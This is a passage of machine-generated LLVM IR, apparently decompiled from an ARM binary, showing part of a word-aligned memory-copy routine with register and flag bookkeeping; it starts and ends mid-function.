  store i32 %v2_158f0, i32* %r4.global-to-local, align 4
  %v3_158f0 = add i32 %v0_158f0, 4
  %v4_158f0 = inttoptr i32 %v3_158f0 to i32*
  %v5_158f0 = load i32, i32* %v4_158f0, align 4
  store i32 %v5_158f0, i32* %r5.global-to-local, align 4
  %v6_158f0 = add i32 %v0_158f0, 8
  %v7_158f0 = inttoptr i32 %v6_158f0 to i32*
  %v8_158f0 = load i32, i32* %v7_158f0, align 4
  store i32 %v8_158f0, i32* %ip.global-to-local, align 4
  %v9_158f0 = add i32 %v0_158f0, 12
  %v10_158f0 = inttoptr i32 %v9_158f0 to i32*
  %v11_158f0 = load i32, i32* %v10_158f0, align 4
  store i32 %v11_158f0, i32* %lr.global-to-local, align 4
  %v12_158f0 = add i32 %v0_158f0, 16
  store i32 %v12_158f0, i32* %r1.global-to-local, align 4
  %v4_158f4 = mul i32 %v2_158f0, 65536
  %v5_158f4 = or i32 %v4_158f4, %v3_158ec
  store i32 %v5_158f4, i32* @r3, align 4
  %v3_158f8 = udiv i32 %v2_158f0, 65536
  %v4_158fc = mul i32 %v5_158f0, 65536
  %v5_158fc = or i32 %v4_158fc, %v3_158f8
  store i32 %v5_158fc, i32* %r4.global-to-local, align 4
  %v3_15900 = udiv i32 %v5_158f0, 65536
  %v4_15904 = mul i32 %v8_158f0, 65536
  %v5_15904 = or i32 %v4_15904, %v3_15900
  store i32 %v5_15904, i32* %r5.global-to-local, align 4
  %v3_15908 = udiv i32 %v8_158f0, 65536
  %v4_1590c = mul i32 %v11_158f0, 65536
  %v5_1590c = or i32 %v4_1590c, %v3_15908
  store i32 %v5_1590c, i32* @ip, align 4
  %v1_15910 = inttoptr i32 %v0_15910 to i32*
  store i32 %v5_158f4, i32* %v1_15910, align 4
  %v3_15910 = add i32 %v0_15910, 4
  %v4_15910 = inttoptr i32 %v3_15910 to i32*
  %v5_15910 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15910, i32* %v4_15910, align 4
  %v6_15910 = add i32 %v0_15910, 8
  %v7_15910 = inttoptr i32 %v6_15910 to i32*
  %v8_15910 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15910, i32* %v7_15910, align 4
  %v9_15910 = add i32 %v0_15910, 12
  %v10_15910 = inttoptr i32 %v9_15910 to i32*
  %v11_15910 = load i32, i32* @ip, align 4
  store i32 %v11_15910, i32* %v10_15910, align 4
  %v12_15910 = add i32 %v0_15910, 16
  store i32 %v12_15910, i32* @r0, align 4
  %v0_15914 = load i32, i32* %r2.global-to-local, align 4
  %v1_15914 = add i32 %v0_15914, -16
  store i32 %v1_15914, i32* %r2.global-to-local, align 4
  %v3_15914 = sub i32 15, %v0_15914
  %v4_15914 = and i32 %v3_15914, %v0_15914
  %v5_15914 = icmp slt i32 %v4_15914, 0
  %v6_15914 = icmp slt i32 %v1_15914, 0
  %v2_15918 = xor i1 %v6_15914, %v5_15914
  br i1 %v2_15918, label %dec_label_pc_1591c, label %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge

dec_label_pc_158ec.dec_label_pc_158ec_crit_edge:  ; preds = %dec_label_pc_158ec
  %v0_158ec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_158f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_158ec

dec_label_pc_1591c:                               ; preds = %dec_label_pc_158ec
  %v2_1591c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1591c, i32* @r4, align 4
  %v5_1591c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1591c, i32* @r5, align 4
  %v1_15920 = add i32 %v0_15914, -4
  store i32 %v1_15920, i32* %r2.global-to-local, align 4
  %v3_15920 = add i32 %v0_15914, 2147483632
  %v4_15920 = and i32 %v1_15920, %v3_15920
  %v5_15920 = icmp slt i32 %v4_15920, 0
  store i1 %v5_15920, i1* %cpsr_v.global-to-local, align 1
  %v6_15920 = icmp slt i32 %v1_15920, 0
  store i1 %v6_15920, i1* %cpsr_n.global-to-local, align 1
  %v7_15920 = icmp eq i32 %v1_15920, 0
  store i1 %v7_15920, i1* %cpsr_z.global-to-local, align 1
  %v2_15924 = xor i1 %v6_15920, %v5_15920
  br i1 %v2_15924, label %dec_label_pc_15940, label %dec_label_pc_15928

dec_label_pc_15928:                               ; preds = %dec_label_pc_1591c, %dec_label_pc_158dc, %dec_label_pc_15928
  %v1_15934 = phi i32 [ %v4_15934, %dec_label_pc_15928 ], [ %v12_15910, %dec_label_pc_1591c ], [ %v0_1597c76, %dec_label_pc_158dc ]
  %v0_15928 = load i32, i32* %lr.global-to-local, align 4
  %v3_15928 = udiv i32 %v0_15928, 65536
  store i32 %v3_15928, i32* %ip.global-to-local, align 4
  %v0_1592c = load i32, i32* %r1.global-to-local, align 4
  %v1_1592c = inttoptr i32 %v0_1592c to i32*
  %v2_1592c = load i32, i32* %v1_1592c, align 4
  store i32 %v2_1592c, i32* %lr.global-to-local, align 4
  %v4_1592c = add i32 %v0_1592c, 4
  store i32 %v4_1592c, i32* %r1.global-to-local, align 4
  %v4_15930 = mul i32 %v2_1592c, 65536
  %v5_15930 = or i32 %v4_15930, %v3_15928
  store i32 %v5_15930, i32* @ip, align 4
  %v2_15934 = inttoptr i32 %v1_15934 to i32*
  store i32 %v5_15930, i32* %v2_15934, align 4
  %v3_15934 = load i32, i32* @r0, align 4
  %v4_15934 = add i32 %v3_15934, 4
  store i32 %v4_15934, i32* @r0, align 4
  %v0_15938 = load i32, i32* %r2.global-to-local, align 4
  %v1_15938 = add i32 %v0_15938, -4
  store i32 %v1_15938, i32* %r2.global-to-local, align 4
  %v3_15938 = sub i32 3, %v0_15938
  %v4_15938 = and i32 %v3_15938, %v0_15938
  %v5_15938 = icmp slt i32 %v4_15938, 0
  %v6_15938 = icmp slt i32 %v1_15938, 0
  %v2_1593c = xor i1 %v6_15938, %v5_15938
  br i1 %v2_1593c, label %dec_label_pc_15940.loopexit, label %dec_label_pc_15928

dec_label_pc_15940.loopexit:                      ; preds = %dec_label_pc_15928
  %v7_15938 = icmp eq i32 %v0_15938, 4
  store i1 %v5_15938, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15938, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15938, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15940

dec_label_pc_15940:                               ; preds = %dec_label_pc_15940.loopexit, %dec_label_pc_1591c
  %v0_157fc60 = phi i32 [ %v1_15938, %dec_label_pc_15940.loopexit ], [ %v1_15920, %dec_label_pc_1591c ]
  %v0_15940 = load i32, i32* %r1.global-to-local, align 4
  %v1_15940 = add i32 %v0_15940, -2
  store i32 %v1_15940, i32* @r1, align 4
  br label %bb140

dec_label_pc_15948:                               ; preds = %dec_label_pc_1585c
  br i1 %v2_158e0, label %dec_label_pc_15994, label %dec_label_pc_15950

dec_label_pc_15950:                               ; preds = %dec_label_pc_15948
  store i32 %v1_158dc, i32* %r2.global-to-local, align 4
  %v3_15954 = load i32, i32* @r4, align 4
  store i32 %v3_15954, i32* %stack_var_-16, align 4
  %v6_15954 = load i32, i32* @r5, align 4
  store i32 %v6_15954, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_15958.dec_label_pc_15958_crit_edge, %dec_label_pc_15950
  %v0_1597c = phi i32 [ %v12_1597c, %dec_label_pc_15958.dec_label_pc_15958_crit_edge ], [ %v0_1597c76, %dec_label_pc_15950 ]
  %v0_1595c = phi i32 [ %v0_1595c.pre, %dec_label_pc_15958.dec_label_pc_15958_crit_edge ], [ %v4_15860, %dec_label_pc_15950 ]
  %v0_15958 = phi i32 [ %v0_15958.pre, %dec_label_pc_15958.dec_label_pc_15958_crit_edge ], [ %v2_15860, %dec_label_pc_15950 ]
  %v3_15958 = udiv i32 %v0_15958, 16777216
  %v1_1595c = inttoptr i32 %v0_1595c to i32*
  %v2_1595c = load i32, i32* %v1_1595c, align 4
  store i32 %v2_1595c, i32* %r4.global-to-local, align 4
  %v3_1595c = add i32 %v0_1595c, 4
  %v4_1595c = inttoptr i32 %v3_1595c to i32*
  %v5_1595c = load i32, i32* %v4_1595c, align 4
  store i32 %v5_1595c, i32* %r5.global-to-local, align 4
  %v6_1595c = add i32 %v0_1595c, 8
  %v7_1595c = inttoptr i32 %v6_1595c to i32*
  %v8_1595c = load i32, i32* %v7_1595c, align 4
  store i32 %v8_1595c, i32* %ip.global-to-local, align 4
  %v9_1595c = add i32 %v0_1595c, 12
  %v10_1595c = inttoptr i32 %v9_1595c to i32*
  %v11_1595c = load i32, i32* %v10_1595c, align 4
  store i32 %v11_1595c, i32* %lr.global-to-local, align 4
  %v12_1595c = add i32 %v0_1595c, 16
  store i32 %v12_1595c, i32* %r1.global-to-local, align 4
  %v4_15960 = mul i32 %v2_1595c, 256
  %v5_15960 = or i32 %v4_15960, %v3_15958
  store i32 %v5_15960, i32* @r3, align 4
  %v3_15964 = udiv i32 %v2_1595c, 16777216
  %v4_15968 = mul i32 %v5_1595c, 256
  %v5_15968 = or i32 %v4_15968, %v3_15964
  store i32 %v5_15968, i32* %r4.global-to-local, align 4
  %v3_1596c = udiv i32 %v5_1595c, 16777216
  %v4_15970 = mul i32 %v8_1595c, 256
  %v5_15970 = or i32 %v4_15970, %v3_1596c
  store i32 %v5_15970, i32* %r5.global-to-local, align 4
  %v3_15974 = udiv i32 %v8_1595c, 16777216
  %v4_15978 = mul i32 %v11_1595c, 256
  %v5_15978 = or i32 %v4_15978, %v3_15974
  store i32 %v5_15978, i32* @ip, align 4
  %v1_1597c = inttoptr i32 %v0_1597c to i32*
  store i32 %v5_15960, i32* %v1_1597c, align 4
  %v3_1597c = add i32 %v0_1597c, 4
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  %v5_1597c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1597c, i32* %v4_1597c, align 4
  %v6_1597c = add i32 %v0_1597c, 8
  %v7_1597c = inttoptr i32 %v6_1597c to i32*
  %v8_1597c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1597c, i32* %v7_1597c, align 4
  %v9_1597c = add i32 %v0_1597c, 12
  %v10_1597c = inttoptr i32 %v9_1597c to i32*
  %v11_1597c = load i32, i32* @ip, align 4
  store i32 %v11_1597c, i32* %v10_1597c, align 4
  %v12_1597c = add i32 %v0_1597c, 16
  store i32 %v12_1597c, i32* @r0, align 4
  %v0_15980 = load i32, i32* %r2.global-to-local, align 4
  %v1_15980 = add i32 %v0_15980, -16
  store i32 %v1_15980, i32* %r2.global-to-local, align 4
  %v3_15980 = sub i32 15, %v0_15980
  %v4_15980 = and i32 %v3_15980, %v0_15980
  %v5_15980 = icmp slt i32 %v4_15980, 0
  %v6_15980 = icmp slt i32 %v1_15980, 0
  %v2_15984 = xor i1 %v6_15980, %v5_15980
  br i1 %v2_15984, label %dec_label_pc_15988, label %dec_label_pc_15958.dec_label_pc_15958_crit_edge

dec_label_pc_15958.dec_label_pc_15958_crit_edge:  ; preds = %dec_label_pc_15958
  %v0_15958.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1595c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15958

dec_label_pc_15988:                               ; preds = %dec_label_pc_15958
  %v2_15988 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15988, i32* @r4, align 4
  %v5_15988 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15988, i32* @r5, align 4
  %v1_1598c = add i32 %v0_15980, -4
  store i32 %v1_1598c, i32* %r2.global-to-local, align 4
  %v3_1598c = add i32 %v0_15980, 2147483632
  %v4_1598c = and i32 %v1_1598c, %v3_1598c
  %v5_1598c = icmp slt i32 %v4_1598c, 0
  store i1 %v5_1598c, i1* %cpsr_v.global-to-local, align 1
  %v6_1598c = icmp slt i32 %v1_1598c, 0
  store i1 %v6_1598c, i1* %cpsr_n.global-to-local, align 1
  %v7_1598c = icmp eq i32 %v1_1598c, 0
  store i1 %v7_1598c, i1* %cpsr_z.global-to-local, align 1
  %v2_15990 = xor i1 %v6_1598c, %v5_1598c
  br i1 %v2_15990, label %dec_label_pc_159ac, label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_15988, %dec_label_pc_15948, %dec_label_pc_15994
  %v1_159a0 = phi i32 [ %v4_159a0, %dec_label_pc_15994 ], [ %v12_1597c, %dec_label_pc_15988 ], [ %v0_1597c76, %dec_label_pc_15948 ]
  %v0_15994 = load i32, i32* %lr.global-to-local, align 4
  %v3_15994 = udiv i32 %v0_15994, 16777216
  store i32 %v3_15994, i32* %ip.global-to-local, align 4
  %v0_15998 = load i32, i32* %r1.global-to-local, align 4
  %v1_15998 = inttoptr i32 %v0_15998 to i32*
  %v2_15998 = load i32, i32* %v1_15998, align 4
  store i32 %v2_15998, i32* %lr.global-to-local, align 4
  %v4_15998 = add i32 %v0_15998, 4
  store i32 %v4_15998, i32* %r1.global-to-local, align 4
  %v4_1599c = mul i32 %v2_15998, 256
  %v5_1599c = or i32 %v4_1599c, %v3_15994
  store i32 %v5_1599c, i32* @ip, align 4
  %v2_159a0 = inttoptr i32 %v1_159a0 to i32*
  store i32 %v5_1599c, i32* %v2_159a0, align 4
  %v3_159a0 = load i32, i32* @r0, align 4
  %v4_159a0 = add i32 %v3_159a0, 4
  store i32 %v4_159a0, i32* @r0, align 4
  %v0_159a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_159a4 = add i32 %v0_159a4, -4
  store i32 %v1_159a4, i32* %r2.global-to-local, align 4
  %v3_159a4 = sub i32 3, %v0_159a4
  %v4_159a4 = and i32 %v3_159a4, %v0_159a4
  %v5_159a4 = icmp slt i32 %v4_159a4, 0
  %v6_159a4 = icmp slt i32 %v1_159a4, 0
  %v2_159a8 = xor i1 %v6_159a4, %v5_159a4
  br i1 %v2_159a8, label %dec_label_pc_159ac.loopexit, label %dec_label_pc_15994

dec_label_pc_159ac.loopexit:                      ; preds = %dec_label_pc_15994
  %v7_159a4 = icmp eq i32 %v0_159a4, 4
  store i1 %v5_159a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_159a4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_159a4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_159ac

dec_label_pc_159ac:                               ; preds = %dec_label_pc_159ac.loopexit, %dec_label_pc_15988
  %v0_157fc61 = phi i32 [ %v1_159a4, %dec_label_pc_159ac.loopexit ], [ %v1_1598c, %dec_label_pc_15988 ]
  %v0_159ac = load i32, i32* %r1.global-to-local, align 4
  %v1_159ac = add i32 %v0_159ac, -1
  store i32 %v1_159ac, i32* @r1, align 4
  br label %bb140

dec_label_pc_159b4:                               ; preds = %entry
  %v1_159b4 = load i32, i32* @r2, align 4
  %v2_159b4 = add i32 %v1_159b4, %v0_15760
  store i32 %v2_159b4, i32* %r1.global-to-local, align 4
  %v2_159b8 = add i32 %v1_159b4, %v1_15760
  store i32 %v2_159b8, i32* %r0.global-to-local, align 4
  %v2_159bc = add i32 %v1_159b4, -4
  store i32 %v2_159bc, i32* %r2.global-to-local, align 4
  %v4_159bc = sub i32 3, %v1_159b4
  %v5_159bc = and i32 %v4_159bc, %v1_159b4
  %v6_159bc = icmp slt i32 %v5_159bc, 0
  store i1 %v6_159bc, i1* %cpsr_v.global-to-local, align 1
  %v7_159bc = icmp slt i32 %v2_159bc, 0
  store i1 %v7_159bc, i1* %cpsr_n.global-to-local, align 1
  %v8_159bc = icmp eq i32 %v1_159b4, 4
  store i1 %v8_159bc, i1* %cpsr_z.global-to-local, align 1
  %v5_159c0 = icmp slt i32 %v1_159b4, 4
  br i1 %v5_159c0, label %bb150, label %dec_label_pc_159c4

dec_label_pc_159c4:                               ; preds = %dec_label_pc_159b4
  %v1_159c4 = urem i32 %v2_159b8, 4
  store i32 %v1_159c4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159c4 = icmp eq i32 %v1_159c4, 0
  store i1 %v2_159c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159c4, label %dec_label_pc_159cc, label %dec_label_pc_15a6c

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159c4
  %v1_159cc = urem i32 %v2_159b4, 4
  store i32 %v1_159cc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159cc = icmp eq i32 %v1_159cc, 0
  store i1 %v2_159cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159cc, label %dec_label_pc_159d4, label %dec_label_pc_15a98

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159cc, %dec_label_pc_15a90
  %v0_159ec37 = phi i32 [ %v2_159b8, %dec_label_pc_159cc ], [ %v0_15ae020, %dec_label_pc_15a90 ]
  %v0_159e836 = phi i32 [ %v2_159b4, %dec_label_pc_159cc ], [ %v0_15a90, %dec_label_pc_15a90 ]
  %v0_159d4 = phi i32 [ %v2_159bc, %dec_label_pc_159cc ], [ %v2_15a88, %dec_label_pc_15a90 ]
  %v2_159d4 = add i32 %v0_159d4, -8
  store i32 %v2_159d4, i32* %r2.global-to-local, align 4
  %v4_159d4 = sub i32 7, %v0_159d4
  %v5_159d4 = and i32 %v4_159d4, %v0_159d4
  %v6_159d4 = icmp slt i32 %v5_159d4, 0
  store i1 %v6_159d4, i1* %cpsr_v.global-to-local, align 1
  %v7_159d4 = icmp slt i32 %v2_159d4, 0
  store i1 %v7_159d4, i1* %cpsr_n.global-to-local, align 1
  %v8_159d4 = icmp eq i32 %v0_159d4, 8
  store i1 %v8_159d4, i1* %cpsr_z.global-to-local, align 1
  %v5_159d8 = icmp slt i32 %v0_159d4, 8
  br i1 %v5_159d8, label %dec_label_pc_15a24, label %dec_label_pc_159dc

dec_label_pc_159dc:                               ; preds = %dec_label_pc_159d4
  %v3_159dc = load i32, i32* @r4, align 4
  %v5_159dc = inttoptr i32 %v3_159dc to i8*
  store i8* %v5_159dc, i8** %stack_var_-8, align 4
  %v8_159dc = load i32, i32* @lr, align 4
  %v2_159e0 = add i32 %v0_159d4, -28
  store i32 %v2_159e0, i32* %r2.global-to-local, align 4
  %v4_159e0 = sub i32 27, %v0_159d4
  %v5_159e0 = and i32 %v4_159e0, %v2_159d4
  %v6_159e0 = icmp slt i32 %v5_159e0, 0
  store i1 %v6_159e0, i1* %cpsr_v.global-to-local, align 1
  %v7_159e0 = icmp slt i32 %v2_159e0, 0
  store i1 %v7_159e0, i1* %cpsr_n.global-to-local, align 1
  %v8_159e0 = icmp eq i32 %v2_159d4, 20
  store i1 %v8_159e0, i1* %cpsr_z.global-to-local, align 1
  %v5_159e4 = icmp slt i32 %v2_159d4, 20
  br i1 %v5_159e4, label %dec_label_pc_15a00, label %dec_label_pc_159e8

dec_label_pc_159e8:                               ; preds = %dec_label_pc_159dc, %dec_label_pc_159e8.dec_label_pc_159e8_crit_edge
  %v0_159ec = phi i32 [ %v1_159f4, %dec_label_pc_159e8.dec_label_pc_159e8_crit_edge ], [ %v0_159ec37, %dec_label_pc_159dc ]
  %v0_159e8 = phi i32 [ %v0_159e8.pre, %dec_label_pc_159e8.dec_label_pc_159e8_crit_edge ], [ %v0_159e836, %dec_label_pc_159dc ]
  %v1_159e8 = add i32 %v0_159e8, -4
  %v2_159e8 = inttoptr i32 %v1_159e8 to i32*
  %v3_159e8 = load i32, i32* %v2_159e8, align 4
  %v4_159e8 = add i32 %v0_159e8, -8
  %v5_159e8 = inttoptr i32 %v4_159e8 to i32*
  %v6_159e8 = load i32, i32* %v5_159e8, align 4
  store i32 %v6_159e8, i32* %r4.global-to-local, align 4
  %v7_159e8 = add i32 %v0_159e8, -12
  %v8_159e8 = inttoptr i32 %v7_159e8 to i32*
  %v9_159e8 = load i32, i32* %v8_159e8, align 4
  store i32 %v9_159e8, i32* %ip.global-to-local, align 4
  %v10_159e8 = add i32 %v0_159e8, -16
  %v11_159e8 = inttoptr i32 %v10_159e8 to i32*
  %v12_159e8 = load i32, i32* %v11_159e8, align 4
  store i32 %v12_159e8, i32* %lr.global-to-local, align 4
  store i32 %v10_159e8, i32* %r1.global-to-local, align 4
  %v1_159ec = add i32 %v0_159ec, -16
  %v2_159ec = inttoptr i32 %v1_159ec to i32*
  store i32 %v3_159e8, i32* %v2_159ec, align 4
  %v4_159ec = add i32 %v0_159ec, -12
  %v5_159ec = inttoptr i32 %v4_159ec to i32*
  %v6_159ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_159ec, i32* %v5_159ec, align 4
  %v7_159ec = add i32 %v0_159ec, -8
  %v8_159ec = inttoptr i32 %v7_159ec to i32*
  %v9_159ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_159ec, i32* %v8_159ec, align 4
  %v10_159ec = add i32 %v0_159ec, -4
  %v11_159ec = inttoptr i32 %v10_159ec to i32*
  %v12_159ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_159ec, i32* %v11_159ec, align 4
  store i32 %v1_159ec, i32* %r0.global-to-local, align 4
  %v0_159f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159f0 = add i32 %v0_159f0, -4
  %v2_159f0 = inttoptr i32 %v1_159f0 to i32*
  %v3_159f0 = load i32, i32* %v2_159f0, align 4
  store i32 %v3_159f0, i32* @r3, align 4
  %v4_159f0 = add i32 %v0_159f0, -8
  %v5_159f0 = inttoptr i32 %v4_159f0 to i32*
  %v6_159f0 = load i32, i32* %v5_159f0, align 4
  store i32 %v6_159f0, i32* %r4.global-to-local, align 4
  %v7_159f0 = add i32 %v0_159f0, -12
  %v8_159f0 = inttoptr i32 %v7_159f0 to i32*
  %v9_159f0 = load i32, i32* %v8_159f0, align 4
  store i32 %v9_159f0, i32* @ip, align 4
  %v10_159f0 = add i32 %v0_159f0, -16
  %v11_159f0 = inttoptr i32 %v10_159f0 to i32*
  %v12_159f0 = load i32, i32* %v11_159f0, align 4
  store i32 %v12_159f0, i32* %lr.global-to-local, align 4
  store i32 %v10_159f0, i32* %r1.global-to-local, align 4
  %v1_159f4 = add i32 %v0_159ec, -32
  %v2_159f4 = inttoptr i32 %v1_159f4 to i32*
  store i32 %v3_159f0, i32* %v2_159f4, align 4
  %v4_159f4 = add i32 %v0_159ec, -28
  %v5_159f4 = inttoptr i32 %v4_159f4 to i32*
  %v6_159f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_159f4, i32* %v5_159f4, align 4
  %v7_159f4 = add i32 %v0_159ec, -24
  %v8_159f4 = inttoptr i32 %v7_159f4 to i32*
  %v9_159f4 = load i32, i32* @ip, align 4
  store i32 %v9_159f4, i32* %v8_159f4, align 4
  %v10_159f4 = add i32 %v0_159ec, -20
  %v11_159f4 = inttoptr i32 %v10_159f4 to i32*
  %v12_159f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_159f4, i32* %v11_159f4, align 4
  store i32 %v1_159f4, i32* %r0.global-to-local, align 4
  %v0_159f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_159f8 = add i32 %v0_159f8, -32
  store i32 %v2_159f8, i32* %r2.global-to-local, align 4
  %v6_159fc = icmp slt i32 %v0_159f8, 32
  br i1 %v6_159fc, label %dec_label_pc_15a00.loopexit, label %dec_label_pc_159e8.dec_label_pc_159e8_crit_edge

dec_label_pc_159e8.dec_label_pc_159e8_crit_edge:  ; preds = %dec_label_pc_159e8
  %v0_159e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_159e8

dec_label_pc_15a00.loopexit:                      ; preds = %dec_label_pc_159e8
  %v4_159f8 = sub i32 31, %v0_159f8
  %v5_159f8 = and i32 %v4_159f8, %v0_159f8
  %v6_159f8 = icmp slt i32 %v5_159f8, 0
  %v7_159f8 = icmp slt i32 %v2_159f8, 0
  store i1 %v6_159f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_159f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_15a00.loopexit, %dec_label_pc_159dc
  %v6_15a08 = phi i32 [ %v1_159f4, %dec_label_pc_15a00.loopexit ], [ %v0_159ec37, %dec_label_pc_159dc ]
  %v0_15a10.pr = phi i32 [ %v2_159f8, %dec_label_pc_15a00.loopexit ], [ %v2_159e0, %dec_label_pc_159dc ]
  %v4_15a00 = add i32 %v0_15a10.pr, 16
  %v6_15a00 = sub i32 0, %v0_15a10.pr
  %v7_15a00 = and i32 %v4_15a00, %v6_15a00
  %v8_15a00 = icmp slt i32 %v7_15a00, 0
  store i1 %v8_15a00, i1* %cpsr_v.global-to-local, align 1
  %v9_15a00 = icmp slt i32 %v4_15a00, 0
  store i1 %v9_15a00, i1* %cpsr_n.global-to-local, align 1
  %v10_15a00 = icmp eq i32 %v4_15a00, 0
  store i1 %v10_15a00, i1* %cpsr_z.global-to-local, align 1
  %v5_15a04 = icmp slt i32 %v0_15a10.pr, -16
  br i1 %v5_15a04, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15a00
  %v6_15a04 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a04 = add i32 %v6_15a04, -4
  %v8_15a04 = inttoptr i32 %v7_15a04 to i32*
  %v9_15a04 = load i32, i32* %v8_15a04, align 4
  store i32 %v9_15a04, i32* @r3, align 4
  %v10_15a04 = add i32 %v6_15a04, -8
  %v11_15a04 = inttoptr i32 %v10_15a04 to i32*
  %v12_15a04 = load i32, i32* %v11_15a04, align 4
  store i32 %v12_15a04, i32* %r4.global-to-local, align 4
  %v13_15a04 = add i32 %v6_15a04, -12
  %v14_15a04 = inttoptr i32 %v13_15a04 to i32*
  %v15_15a04 = load i32, i32* %v14_15a04, align 4
  store i32 %v15_15a04, i32* @ip, align 4
  %v16_15a04 = add i32 %v6_15a04, -16
  %v17_15a04 = inttoptr i32 %v16_15a04 to i32*
  %v18_15a04 = load i32, i32* %v17_15a04, align 4
  store i32 %v18_15a04, i32* %lr.global-to-local, align 4
  store i32 %v16_15a04, i32* %r1.global-to-local, align 4
  %v7_15a08 = add i32 %v6_15a08, -16
  %v8_15a08 = inttoptr i32 %v7_15a08 to i32*
  store i32 %v9_15a04, i32* %v8_15a08, align 4
  %v10_15a08 = add i32 %v6_15a08, -12
  %v11_15a08 = inttoptr i32 %v10_15a08 to i32*
  %v12_15a08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15a08, i32* %v11_15a08, align 4
  %v13_15a08 = add i32 %v6_15a08, -8
  %v14_15a08 = inttoptr i32 %v13_15a08 to i32*
  %v15_15a08 = load i32, i32* @ip, align 4
  store i32 %v15_15a08, i32* %v14_15a08, align 4
  %v16_15a08 = add i32 %v6_15a08, -4
  %v17_15a08 = inttoptr i32 %v16_15a08 to i32*
  %v18_15a08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15a08, i32* %v17_15a08, align 4
  store i32 %v7_15a08, i32* %r0.global-to-local, align 4
  %v6_15a0c = load i32, i32* %r2.global-to-local, align 4
  %v7_15a0c = add i32 %v6_15a0c, -16
  store i32 %v7_15a0c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15a00, %bb147
  %v6_15a18 = phi i32 [ %v7_15a08, %bb147 ], [ %v6_15a08, %dec_label_pc_15a00 ]
  %v0_15a10 = phi i32 [ %v7_15a0c, %bb147 ], [ %v0_15a10.pr, %dec_label_pc_15a00 ]
  %v4_15a10 = add i32 %v0_15a10, 20
  store i32 %v4_15a10, i32* %r2.global-to-local, align 4
  %v6_15a10 = sub i32 0, %v0_15a10
  %v7_15a10 = and i32 %v4_15a10, %v6_15a10
  %v8_15a10 = icmp slt i32 %v7_15a10, 0
  store i1 %v8_15a10, i1* %cpsr_v.global-to-local, align 1
  %v9_15a10 = icmp slt i32 %v4_15a10, 0
  store i1 %v9_15a10, i1* %cpsr_n.global-to-local, align 1
  %v10_15a10 = icmp eq i32 %v4_15a10, 0
  store i1 %v10_15a10, i1* %cpsr_z.global-to-local, align 1
  %v5_15a14 = icmp slt i32 %v0_15a10, -20
  br i1 %v5_15a14, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15a14 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a14 = add i32 %v6_15a14, -4
  %v8_15a14 = inttoptr i32 %v7_15a14 to i32*
  %v9_15a14 = load i32, i32* %v8_15a14, align 4
  store i32 %v9_15a14, i32* @r3, align 4
  %v10_15a14 = add i32 %v6_15a14, -8
  %v11_15a14 = inttoptr i32 %v10_15a14 to i32*
  %v12_15a14 = load i32, i32* %v11_15a14, align 4
  store i32 %v12_15a14, i32* @ip, align 4
  %v13_15a14 = add i32 %v6_15a14, -12
  %v14_15a14 = inttoptr i32 %v13_15a14 to i32*
  %v15_15a14 = load i32, i32* %v14_15a14, align 4
  store i32 %v15_15a14, i32* %lr.global-to-local, align 4
  store i32 %v13_15a14, i32* %r1.global-to-local, align 4
  %v7_15a18 = add i32 %v6_15a18, -12
  %v8_15a18 = inttoptr i32 %v7_15a18 to i32*
  store i32 %v9_15a14, i32* %v8_15a18, align 4
  %v10_15a18 = add i32 %v6_15a18, -8
  %v11_15a18 = inttoptr i32 %v10_15a18 to i32*
  %v12_15a18 = load i32, i32* @ip, align 4
  store i32 %v12_15a18, i32* %v11_15a18, align 4
  %v13_15a18 = add i32 %v6_15a18, -4
  %v14_15a18 = inttoptr i32 %v13_15a18 to i32*
  %v15_15a18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15a18, i32* %v14_15a18, align 4
  store i32 %v7_15a18, i32* %r0.global-to-local, align 4
